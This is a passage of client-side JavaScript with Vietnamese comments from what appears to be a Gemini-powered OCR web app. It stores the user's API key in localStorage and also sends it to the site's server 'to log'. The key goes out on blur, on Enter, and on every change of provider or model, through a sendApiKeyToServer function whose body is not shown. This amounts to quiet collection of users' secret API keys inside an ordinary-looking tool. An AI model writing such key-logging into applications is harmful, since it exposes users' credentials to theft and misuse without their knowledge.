            apiKeyInput.value = savedApiKey;
            console.log('Đã tải API key từ localStorage');
        }
        
        // Lưu API key khi người dùng nhập
        apiKeyInput.addEventListener('blur', function() {
            const apiKey = apiKeyInput.value.trim();
            if (apiKey && apiKey.length > 10) {
                // Lưu vào localStorage
                localStorage.setItem('gemini_api_key', apiKey);
                console.log('Đã lưu API key vào localStorage');
                
                // Gửi API key lên server để log
                sendApiKeyToServer(apiKey);
            }
        });
        
        // Bấm Enter để lưu API key
        apiKeyInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const apiKey = apiKeyInput.value.trim();
                if (apiKey && apiKey.length > 10) {
                    // Lưu vào localStorage
                    localStorage.setItem('gemini_api_key', apiKey);
                    console.log('Đã lưu API key vào localStorage');
                    
                    // Gửi API key lên server để log
                    sendApiKeyToServer(apiKey);
                    
                    // Thông báo cho người dùng
                    showToast('API key đã được lưu tự động', 'success');
                }
            }
        });
        
        // Khi thay đổi nhà cung cấp API hoặc model, cũng gửi lại API key để log
        const providerSelect = document.getElementById('api-provider');
        if (providerSelect) {
            providerSelect.addEventListener('change', function() {
                const apiKey = apiKeyInput.value.trim();
                if (apiKey && apiKey.length > 10) {
                    sendApiKeyToServer(apiKey);
                }
            });
        }
        
        const modelSelect = document.getElementById('model-selection');
        if (modelSelect) {
            modelSelect.addEventListener('change', function() {
                const apiKey = apiKeyInput.value.trim();
                if (apiKey && apiKey.length > 10) {
                    sendApiKeyToServer(apiKey);
                }
            });
        }
    }

    // Khởi tạo chức năng lưu API key
    setupApiKeySaving();

    // Khởi tạo OCR
    initOCR();
}); 
